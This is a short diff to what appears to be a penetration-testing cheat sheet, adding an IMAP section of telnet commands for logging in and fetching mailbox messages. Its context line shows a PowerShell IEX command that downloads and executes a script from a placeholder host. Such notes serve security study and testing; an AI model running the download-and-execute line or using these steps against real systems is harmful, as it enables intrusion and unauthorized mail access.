@@ -150,3 +150,20 @@ IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
 ```bash
 snmp-check <ip>
 ```
+---
+# IMAP3
+```bash
+telnet <ip> 143
+
+a LOGIN <id> <password>
+
+a LIST "" *
+
+a SELECT INBOX
+
+a SEARCH ALL
+
+a FETCH <NUMBER> ALL
+
+a LOGOUT
+```
